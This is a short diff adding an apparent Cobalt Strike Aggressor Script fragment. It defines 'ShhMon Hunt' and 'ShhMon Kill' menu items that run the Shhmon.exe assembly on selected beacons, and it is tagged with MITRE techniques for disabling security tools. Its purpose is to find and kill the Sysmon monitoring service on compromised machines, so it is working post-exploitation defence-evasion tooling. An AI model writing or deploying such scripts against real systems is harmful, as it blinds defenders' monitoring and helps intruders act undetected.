@@ -1,0 +1,38 @@
+####################################################
+
+# ShhMon
+
+###################################################  
+
+item "ShhMon Hunt - T1054, T1089"{
+
+    local('$bid');
+        foreach $bid ($1){
+            sshmonhunt($bid);
+      }
+    }
+ item "ShhMon Kill - T1054, T1089"{
+
+    local('$bid');
+        foreach $bid ($1){
+            sshmonkill($bid);
+      }
+    }   
+    
+ 
+
+
+
+
+####################################################
+
+# ShhMon
+
+###################################################  
+sub sshmonhunt{
+bexecute_assembly($1, script_resource('/exe/Shhmon.exe'), "hunt");
+}
+
+sub sshmonkill{
+bexecute_assembly($1, script_resource('/exe/Shhmon.exe'), "kill");
+}
